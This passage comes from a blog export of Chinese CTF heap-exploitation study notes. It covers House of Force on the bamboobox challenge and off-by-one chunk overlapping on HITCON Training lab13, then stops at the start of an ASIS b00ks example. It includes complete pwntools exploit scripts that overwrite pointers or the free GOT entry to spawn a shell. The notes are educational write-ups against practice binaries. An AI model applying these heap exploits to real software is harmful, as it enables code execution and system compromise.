观察到程序首先allocate了一个0x10 size的chunk来保存一个问候和再见的消息的指针，并且在程序结束的时候会对其进行调用，所以我们只要将告别的指针覆盖为<code>magic()</code>就能getshell。也就是将<code>0x603268</code>覆盖为<code>0x400D49</code>。</p>\n<h4><span id=\"利用\">利用</span></h4><h5><span id=\"更改top-chunk-size\">更改top chunk size</span></h5><p>​        由于程序直接给了无size限制的edit功能，所以只需要利用edit将top chunk的size以及pre size修改就可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">48</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">gdb.attach(r)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">64</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">56</span>+p64(<span class=\"number\">0xffffffffffffffff</span>))</span><br></pre></td></tr></table></figure>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-25%20%E4%B8%8B%E5%8D%884.21.03.png\" alt=\"截屏2022-03-25 下午4.21.03\"></p>\n<h5><span id=\"申请target-addr\">申请target addr</span></h5><p>​        这样就大致将top chunk的size修改为一个非常大的size了，以供我们申请任意size的chunk，实现将topchunk ptr指向target addr的效果。</p>\n<p>​        回想一下，现在top chunk的ptr是。。。为什么有随机化啊。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-25%20%E4%B8%8B%E5%8D%885.01.51.png\" alt=\"截屏2022-03-25 下午5.01.51\"></p>\n<p>​    （随机化的小插曲大概是由于整个ubuntu的环境并没有禁用aslr）现在需要让top chunk ptr由32b0指向3268。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">malloc_size = -<span class=\"number\">0x69</span><span class=\"comment\">#-（0x30+0x20+0x8+0xf+0x2)</span></span><br><span class=\"line\">add(malloc_size,<span class=\"string\">b&#x27;aaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,p64(magic)*<span class=\"number\">2</span>)</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-25%20%E4%B8%8B%E5%8D%887.16.21.png\" alt=\"截屏2022-03-25 下午7.16.21\"></p>\n<p>​        </p>\n<p>​        可以看到top chunk已经指向<code>0x603250</code>了，所以这时候只需要add 0x10的chunk覆盖指针，就行。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-25%20%E4%B8%8B%E5%8D%887.19.50.png\" alt=\"截屏2022-03-25 下午7.19.50\"></p>\n<h4><span id=\"exp\">exp：</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">goodbye_addr = <span class=\"number\">0x603268</span></span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x400D49</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#ar = process([&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;,&quot;./bamboobox&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/64/lib/libc.so.6&quot;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">#r = process(&quot;./bamboobox&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">size, name</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span>(<span class=\"params\">idx, size, name</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span>():</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">48</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">64</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">56</span>+p64(<span class=\"number\">0xffffffffffffffff</span>))</span><br><span class=\"line\">malloc_size = -<span class=\"number\">0x69</span></span><br><span class=\"line\">add(malloc_size,<span class=\"string\">b&#x27;aaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,p64(magic)*<span class=\"number\">2</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">&quot;5&quot;</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n","categories":["Binary_security"],"tags":["HEAP - House Of Force"]},{"title":"off by one /chunk overlapping","url":"/2022/04/04/heap_leaarning_off%20by%20one/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-bwCOCejp\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h1><span id=\"0\">0</span></h1><p>​        这篇笔记最早是在大概21年的11月开始的，当时其实也是抱着复习的心理去写的，毕竟堆题在完全吃透之前，只要不是经常做题，那么就基本是学了就忘的状态。更别说我这种就没怎么做题的人。</p>\n<p>​        现在是2022年四月，我看着这篇笔记，只觉得当时那些卡了很久的点，实在过于愚蠢，完全无法理解当时自己为什么会这么想。这些困难点大多源于我看代码不仔细，以及对于指针操作的一些不理解，或者说对于chunk结构的不熟悉。</p>\n<p>​        并且那个时候写wp的思路完全是走一步看一步，没有大体getshell的思路，没有整体题目的逆向，关于漏洞点的分析，和如何leak 内存，或者修改内存，最终getshell的大纲，就是纯纯照着wp瞎写，wp怎么想我也怎么想，现在想来真的很蠢，我现在终于知道我21年下半年在干什么了，在无穷尽的摆烂享乐和陷于差劲学习方式带来的痛苦的自我感动之中，真的烂透了。</p>\n<p>​        所以我把那些可笑的内容全部删除并增加了新的内容与思考，算是第二次复习吧。</p>\n<h1><span id=\"概念\">概念</span></h1><p>​        单/空字节溢出攻击。</p>\n<p>​        通常来说简单的off by one的漏洞点来自于编写时对边界控制不严格，导致每次输入的字符都能比规定的最大字符大那么一些（一个，或者几个）。这些字节溢出到物理地址相邻的下一个堆块，就能修改下一个chunk的size或者<code>prev_inuse</code>，通过这样的溢出，就能够构造一些有趣的攻击。</p>\n<p>​        通常单字节溢出的利用方式有如下几种：</p>\n<ol>\n<li>溢出任意可控制字节：修改chunk size，造成堆叠，泄露或覆盖其他块的数据</li>\n<li>溢出空字节：修改下一个chunk的<code>prev_inuse</code>，使得当前chunk状态为free，然后就可以：1）利用unlink进行攻击。2）对于下一个chunk来说，前一个chunk状态为free，自身的prev_size域启用，就能够伪造<code>prev_size</code>，改变前一个chunk的size，造成堆叠。</li>\n</ol>\n<p>​        </p>\n<p>​        从ctf-wiki上的一个简单的小例子开始：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">my_gets</span><span class=\"params\">(<span class=\"keyword\">char</span> *ptr,<span class=\"keyword\">int</span> size)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;=size;i++)#栅栏错误</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ptr[i]=getchar();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *chunk1,*chunk2;</span><br><span class=\"line\">    chunk1=<span class=\"built_in\">malloc</span>(<span class=\"number\">16</span>);</span><br><span class=\"line\">    chunk2=<span class=\"built_in\">malloc</span>(<span class=\"number\">16</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Get Input:&quot;</span>);</span><br><span class=\"line\">    my_gets(chunk1,<span class=\"number\">16</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%882.09.13.png\" alt=\"截屏2021-12-08 下午2.09.13\">        </p>\n<p>可以看到0x1994020的最低位被覆盖为了a。当然这里是因为前一个chunk属于已分配状态，所以下一个chunk的<code>prev_size</code>被内存复用为了前一个chunk的内容。</p>\n<p>字符串操作则同理。</p>\n<h1><span id=\"offbyone利用方式\">offbyone利用方式</span></h1><h2><span id=\"chunk-overlapping\">chunk overlapping</span></h2><p>​        off by one的一个比较简单的利用就是chunk overlapping，简单讲就是通过溢出将chunk的<code>prev_size</code>位修改，导致几个连续的chunk的内存空间发生了重叠，借此可以泄露一些数据或者覆盖chunk指针。</p>\n<p>​        在举例子之前先复习一下与chunk size有关的一些操作。</p>\n<p>​        获取当前chunk size ：通过堆指针的直接获取size位</p>\n<p>​        获取当前chunk的use状态：通过当前<code>chunk_bp</code>+<code>chunk_size</code>获取下一个chunk的<code>bp</code>，然后获得<code>prev_inuse</code>位。</p>\n<p>​        获取前一个chunk size  ：利用当前chunk指针获取当前chunk的<code>prev_size</code>。</p>\n<p>​        获取下一个chunk的地址 ：利用当前chunk的size，下一个chunk地址即为：当前chunk指针+size。</p>\n<p>​        获取前一个chunk的信息：先通过<code>prev_size</code>算出前一个chunk的堆指针，然后再利用前一个chunk的对指针来获得相关信息。</p>\n<h3><span id=\"例1hitcon-trainging-lab13\">例1:HITCON Trainging lab13</span></h3><p><a href=\"https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13\">题目链接</a></p>\n<h4><span id=\"overview\">overview</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-04%20%E4%B8%8A%E5%8D%889.31.27.png\" alt=\"截屏2022-04-04 上午9.31.27\"></p>\n<p>patial retro,无pie。</p>\n<h4><span id=\"re\">re</span></h4><h5><span id=\"add\">add</span></h5><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">*(&amp;heaparray + i) = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>uLL);</span><br></pre></td></tr></table></figure>\n<p>​        首先申请10大小的chunk作为note结构体的指针。</p>\n<p>​        然后申请<code>size+8</code>大小的chunk，在<code>*(&amp;heaparray + i) + 1</code>输入content并把size储存在<code>*(&amp;heaparray + i)</code>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">*(_QWORD *)*(&amp;heaparray + i) = size;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content of heap:&quot;</span>);</span><br><span class=\"line\">read_input(*((_QWORD *)*(&amp;heaparray + i) + <span class=\"number\">1</span>), size);</span><br></pre></td></tr></table></figure>\n<h5><span id=\"edit\">edit</span></h5><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">read_input(*((_QWORD *)*(&amp;heaparray + v1) + <span class=\"number\">1</span>), *(_QWORD *)*(&amp;heaparray + v1) + <span class=\"number\">1LL</span>);</span><br></pre></td></tr></table></figure>\n<p>​        <code>edit()</code>中，可以输入的字符比规定的多了一个字节。</p>\n<h5><span id=\"show\">show</span></h5><p>打印也是多输出一个字节</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size : %ld\\nContent : %s\\n&quot;</span>, *(_QWORD *)*(&amp;heaparray + v1), *((<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **)*(&amp;heaparray + v1) + <span class=\"number\">1</span>));</span><br></pre></td></tr></table></figure>\n<h5><span id=\"free\">free</span></h5><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">free</span>(*((<span class=\"keyword\">void</span> **)*(&amp;heaparray + v1) + <span class=\"number\">1</span>));</span><br><span class=\"line\"><span class=\"built_in\">free</span>(*(&amp;heaparray + v1));</span><br><span class=\"line\">*(&amp;heaparray + v1) = <span class=\"number\">0LL</span>;</span><br></pre></td></tr></table></figure>\n<p>首先释放chunk struct chunk，再释放chunk content chunk，没有什么大问题。</p>\n<h4><span id=\"利用\">利用</span></h4><p>​        程序并没有其他非常规的操作，就是单纯的off by one+chunk overlapping的利用。所以按照常规的思路走，既可以改got表，也有完备的leak功能，就先利用off by one leak 内存，再通过堆叠修改note结构中的指针为free got addr。</p>\n<p>​        由于我们只能溢出一个字节，我们的希望把last chunk的size更改至能够包含下一个chunk的空间，比如说last chunk size为0x10，next chunk为0x8，那么改last chunk为0x40，next chunk其实就被包含在了last chunk的content范围中，正好next chunk的结构中含有chunk ptr，所以我们可以通过edit last chunk 的content实现对于next chunk ptr的更改，打印。</p>\n<p>​        </p>\n<h5><span id=\"溢出chunk1-structure-chunk-size\">溢出chunk1 structure chunk size</span></h5><p>​        首先溢出一个字节，将lastchunk的size更改</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-04%20%E4%B8%8A%E5%8D%8810.37.11.png\" alt=\"截屏2022-04-04 上午10.37.11\"></p>\n<p>​        对于每个note，程序会额外分配0x10的结构，这点呈现在内存空间中，如图所示，这里我们依次add了两个0x10大小的note。对于chunk0.content从030地址处开始读入，合法情况下会读入到040前，我们尝试溢出。在没有十分清晰的思路前，我们可以先随便溢一些东西测试一下。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-04%20%E4%B8%8A%E5%8D%8810.50.24.png\" alt=\"截屏2022-04-04 上午10.50.24\"></p>\n<p>​        可以看到，确实溢出了，但是并没有什么意义，因为chunk0的content chunk16位对齐了，而我们需要在last chunk的<code>size</code>溢出，而不是<code>prev_size</code>，所以chunk0的<code>size</code>应该是8位对齐，比如说0x18。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>)<span class=\"comment\">#chunk0</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>)<span class=\"comment\">#chunk1</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span> + <span class=\"string\">b&#x27;\\x41&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>​        我们更正chunk0 size为0x18，溢出0x41。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-04%20%E4%B8%8A%E5%8D%8810.53.03.png\" alt=\"截屏2022-04-04 上午10.53.03\"></p>\n<p>​        为什么是0x41呢？我们申请的chunk1的size是0x10，加上chunk头，总共是0x20大小，并且加上chunk struct chunk的0x20，能够实现chunk overlapping的最小size就是0x40，当然还要加上inuse位的“1”。</p>\n<p>​        当我们成功实现溢出，此时chunk1的structure chunk size就是0x41。但是仅仅这样我们并没有任何方法可以修改储存在chunk1 struct chunk 中的chunk ptr，因此我们需要进一步利用。</p>\n<h5><span id=\"fastbin中构造chunk-overlapping\">fastbin中构造chunk overlapping</span></h5><p>​        我们释放chunk1，此时，fastbin中是这样的。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-04%20%E4%B8%8A%E5%8D%8811.10.03.png\" alt=\"截屏2022-04-04 上午11.10.03\"></p>\n<p>​            可以看出bin中发生了空间的重叠。那么这样的重叠会造成什么问题呢？假设先add0x40的chunk，那么就在040处分配，此时再add 0x20的chunk，则会在060处分配，在这道题里，0x20的chunk正好对应一个structure chunk，所以我们可以通过写一个size小于等于0x30的chunk，来更改struct chunk中的ptr。但是有一些条件需要保证，比如说0x40chunk的user space必须要在struct chunk前开始，或者正好相符，但是这个条件申请0x30的话完全可以满足。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">10</span>)</span><br></pre></td></tr></table></figure>\n<p>测试一下</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-04%20%E4%B8%8A%E5%8D%8811.19.57.png\" alt=\"截屏2022-04-04 上午11.19.57\">        </p>\n<p>​        </p>\n<p>稍微有一些怪，为什么之前的chunk1 struct chunk的内容没有被清空。</p>\n<p>​            <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-04%20%E4%B8%8A%E5%8D%8811.25.49.png\" alt=\"截屏2022-04-04 上午11.25.49\"></p>\n<p>感觉出了一些我无法解释的bug，暂时先放一放吧。接着可以修改ptr为free got addr</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>+p64(<span class=\"number\">0x20</span>)*<span class=\"number\">2</span>+p64(free_got_addr))</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n<p>然后打印chunk1。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-04%20%E4%B8%8A%E5%8D%8811.42.44.png\" alt=\"截屏2022-04-04 上午11.42.44\"></p>\n<p>这里被搞了，一直没有办法搞到干净的free addr，只能跑去学习先进的py知识。</p>\n<p>我用的是</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;Content : &quot;</span>)</span><br><span class=\"line\">free_addr =  u64(r.recv()[<span class=\"number\">0</span>:<span class=\"number\">8</span>])<span class=\"comment\">#0x7ffff7ab1c50</span></span><br></pre></td></tr></table></figure>\n<p>先进的py知识是：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;Content : &quot;</span>)</span><br><span class=\"line\">data = r.recvuntil(<span class=\"string\">&quot;Done !&quot;</span>)</span><br><span class=\"line\">free_addr = u64(data.split(<span class=\"string\">&quot;\\n&quot;</span>)[<span class=\"number\">0</span>].ljust(<span class=\"number\">8</span>, <span class=\"string\">&quot;\\x00&quot;</span>))</span><br></pre></td></tr></table></figure>\n<h5><span id=\"修改free-got为system\">修改free got为system</span></h5><p>​        先是常规拿system地址。然后需要修改free got为system，而观察程序，chunk structure chunk中的ptr指向的是chunk content，我们已经将这个ptr改成了一个指向free got的指针，所以只需要修改对应的chunk content，就相当于修改了free got。</p>\n<p>​            所以接下来，我们只需要修改chunk1的content为system addr，同时为了getshell，我们需要free一个content为binsh字符串的chunk，这时候我们可以再add一个chunk，也可以将chunk0的content更改成binsh字符串，然后free chunk0。</p>\n<h5><span id=\"exp\">exp</span></h5><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">r = process([<span class=\"string\">&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./heapcreator&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./heapcreator&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free_got_addr = elf.got[<span class=\"string\">&#x27;free&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">size, content</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span>(<span class=\"params\">idx, content</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>)<span class=\"comment\">#chunk0</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>)<span class=\"comment\">#chunk1</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span> + <span class=\"string\">b&#x27;\\x41&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>+p64(<span class=\"number\">0x20</span>)*<span class=\"number\">2</span>+p64(free_got_addr))</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">data = r.recvuntil(<span class=\"string\">&quot;Done !&quot;</span>)</span><br><span class=\"line\">free_addr = u64(data.split(<span class=\"string\">b&quot;\\n&quot;</span>)[<span class=\"number\">0</span>].ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">system_addr = free_addr - (libc.symbols[<span class=\"string\">&#x27;free&#x27;</span>] - libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;system_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(system_addr)))</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,p64(system_addr))</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">b&quot;/bin/sh;&quot;</span>)<span class=\"comment\">#chunk2</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h4><span id=\"感想\">感想：</span></h4><p>​        为什么这样一道题也要写感想捏？主要是因为之前学习的时候花了很多时间，并且感觉十分困难，但是今天再来看一看，感觉这个题在同类型中尤其简单，并且在笔记中发现了很多很无语的错误。我并不是为觉得自己进步多大而感到兴奋，而是为半年前我自己的菜感到不可思议，我真的无法理解，但是过去无法改变，也没必要怨天尤人。</p>\n<h3><span id=\"例2asis-ctf-2016-b00ks\">例2：</span></h3><h4><span id=\"overview\">overview</span></h4><p>​        ctf-wiki上的例子，之前一直没有做，正好拿来复习offbyone。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-02%20%E4%B8%8A%E5%8D%889.49.38.png\" alt=\"截屏2022-04-02 上午9.49.38\"></p>\n<p>首先肯定不能改got了。canary没开也比较灵性，不过开不开都差不多其实。</p>\n<h4><span id=\"re\">re</span></h4><p>​        菜单，每个book的结构其实相对来说并不复杂。book 结构体的分配如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">*((_DWORD *)book_ptr + <span class=\"number\">6</span>) = size;</span><br><span class=\"line\">*((_QWORD *)head + v2) = book_ptr;</span><br><span class=\"line\">*((_QWORD *)book_ptr + <span class=\"number\">2</span>) = des_ptr;</span><br><span class=\"line\">*((_QWORD *)book_ptr + <span class=\"number\">1</span>) = name_ptr;</span><br><span class=\"line\">*(_DWORD *)book_ptr = ++unk_202024;<span 